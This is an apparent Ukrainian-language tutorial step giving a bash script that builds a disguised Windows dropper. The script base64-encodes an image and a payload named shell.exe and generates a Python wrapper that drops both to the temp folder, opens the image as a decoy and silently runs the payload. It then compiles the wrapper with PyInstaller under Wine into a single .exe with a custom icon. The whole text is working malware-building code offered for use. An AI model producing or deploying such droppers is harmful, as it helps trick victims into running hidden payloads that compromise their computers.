відкриваю термінал в New Folder і роблю скрипт :
 nano build_wrapper.sh 
 із вмістом (головне не захопити екрануючих знаків):
 
```bash
#!/bin/bash

ICON="sraka.ico"
IMG="sraka.png"
PAYLOAD="shell.exe"
WRAPPER="wrapper.py"

echo "[+] Кодуємо файли в base64..."
base64 -w 0 "$IMG" > sraka.png.b64
base64 -w 0 "$PAYLOAD" > shell.exe.b64

echo "[+] Генеруємо $WRAPPER без символів U+200B..."
cat > $WRAPPER << 'EOF'
import base64
import os
import tempfile
import subprocess

def extract_file(encoded_data, filename):
    path = os.path.join(tempfile.gettempdir(), filename)
    with open(path, 'wb') as f:
        f.write(base64.b64decode(encoded_data))
    return path

# base64 дані
png_data = """REPLACE_IMG"""
exe_data = """REPLACE_EXE"""

# Розпаковка
img_path = extract_file(png_data, "sraka.png")
exe_path = extract_file(exe_data, "shell.exe")

# Відкриття
subprocess.Popen(["start", "", img_path], shell=True)
subprocess.Popen([exe_path], shell=True)
EOF

# Вставляємо кодовані рядки
sed -i "s|REPLACE_IMG|$(cat sraka.png.b64)|" $WRAPPER
sed -i "s|REPLACE_EXE|$(cat shell.exe.b64)|" $WRAPPER

echo "[+] Чистимо старі артефакти..."
rm -rf dist build __pycache__ wrapper.spec

echo "[+] Збірка .exe через Wine..."
wine pyinstaller --onefile --icon="$ICON" "$WRAPPER"

echo "[✔] Успішно! Шукай у dist/wrapper.exe"
```
